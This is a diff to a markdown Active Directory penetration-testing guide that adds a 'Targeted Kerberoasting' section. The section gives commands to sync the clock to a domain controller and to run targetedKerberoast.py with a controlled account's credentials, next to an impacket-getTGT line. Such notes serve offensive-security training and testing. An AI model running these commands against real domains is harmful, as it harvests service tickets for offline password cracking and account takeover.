@@ -140,6 +140,16 @@ export KRB5CCNAME=USER.ccache
 impacket-getTGT $DOMAIN/$USER -aesKey AES256_KEY -dc-ip $DC_IP
 ```
 
+## 3.5 Targeted Kerberoasting
+
+```bash
+# KRB_AP_ERR_SKEW(Clock skew too great)
+timedatectl set-ntp off
+sudo ntpdate $DC_IP
+
+targetedKerberoast.py -v -d 'domain.local' -u 'controlledUser' -p 'ItsPassword'
+```
+
 ---
 
 [← Prev: 02 — Enumeration](02-enumeration.md) | [Next: 04 — Password Attacks & Credential Abuse →](04-password-attacks-and-credential-abuse.md)
